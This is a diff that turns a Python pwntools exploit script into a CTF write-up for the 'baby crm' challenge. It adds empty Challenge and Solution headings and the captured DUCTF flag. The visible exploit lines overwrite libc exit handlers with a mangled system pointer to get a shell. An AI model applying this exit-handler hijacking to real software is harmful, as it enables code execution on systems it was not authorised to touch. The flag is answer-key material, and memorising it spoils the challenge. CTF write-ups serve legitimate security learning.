@@ -1,3 +1,12 @@
+# baby crm
+
+## Challenge
+
+## Solution
+
+## Exploit
+
+```py
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
@@ -173,3 +182,10 @@ arb_write(exit_funcs + 0x138, flat([encrypt(libc.sym['system'], key), next(libc.
 io.sendlineafter(b'> ', b'5')
 
 io.interactive()
+```
+
+## Flag
+
+```
+DUCTF{0u7_0f_5c0p3_0u7_0f_m1nd}
+```
